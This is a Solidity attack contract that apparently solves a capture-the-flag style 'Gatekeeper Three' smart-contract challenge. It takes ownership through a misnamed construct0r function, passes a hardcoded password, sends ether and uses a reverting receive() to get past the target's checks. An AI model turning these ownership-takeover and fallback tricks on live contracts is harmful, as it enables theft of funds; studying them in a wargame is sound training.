// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGatekeeperThree { // 1) change interface name

    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function enter() external;

}

contract GatekeeperThreeAttack { // 2) change contract name

    IGatekeeperThree target;

    constructor(address _target) payable {
        target = IGatekeeperThree(_target);
    }

    function attack() external {
        target.construct0r();
        target.getAllowance(1774527900);
        (bool success, ) = address(target).call{value: 0.002 ether}("");
        require(success, "call failed");
        target.enter();
    }

    receive() external payable {
        revert();
    }
}